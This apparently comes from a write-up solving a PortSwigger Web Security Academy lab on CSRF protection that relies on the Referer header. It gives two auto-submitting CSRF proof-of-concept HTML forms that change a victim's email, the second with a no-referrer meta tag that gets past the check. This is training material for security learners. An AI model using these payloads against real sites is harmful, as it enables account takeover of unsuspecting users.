![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/f7f90272-3b22-4fc8-98fe-75c0da3d8ae8)

### Solution

Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/01a2774e-1a50-401d-86c4-f3d9cf213278)

Send the request to Burp Repeater and Generte the payload

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1800510312f70081de9dc2001700c5.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abcd&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/6944f3d9-1817-4e10-a07d-fb360e881096)

when viewing the exploit it will show as invalid Referer header.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/ae186699-25a7-4597-9bca-f4a4b122854e)

Then Delete the Referer header entirely and observe that the request is now accepted.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/609baa69-4114-436f-b21b-849fadb1dacb)

request worked.

Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Include the following HTML to suppress the Referer header:

```js
<meta name="referrer" content="no-referrer">
```
now Generte the payload an insert this payload in that.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/c0b837c3-c266-4f48-8573-37f9dd130e0a)

now we will view the exploit

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/0bab7b53-6212-4f49-b6b0-86527fc531f6)

it worked

payload

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <meta name="referrer" content="no-referrer">
    <form action="https://0a1800510312f70081de9dc2001700c5.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="a1234&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

deliver it to solve the lab

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/476133d3-897e-4aba-ba0f-5f8233343b2c)

lab solved succesfully
